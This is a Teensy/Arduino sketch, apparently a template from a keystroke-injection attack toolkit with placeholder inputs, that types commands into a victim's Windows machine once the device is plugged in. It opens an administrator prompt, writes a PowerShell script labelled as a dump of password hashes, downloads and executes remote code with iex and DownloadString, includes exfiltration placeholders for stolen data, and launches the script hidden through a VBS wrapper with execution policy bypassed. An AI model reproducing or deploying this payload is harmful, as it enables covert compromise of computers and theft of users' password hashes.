#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif



void setup(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Dump of Password hashes\" > %temp%\\dl.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dl.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\dl.ps1");
  Keyboard.println("echo $pv = iex $wc.DownloadString(\"INPUT4\") >> %temp%\\dl.ps1");

  String fn = "dl";
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dl.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){
}


DEFS
EXFILDEFS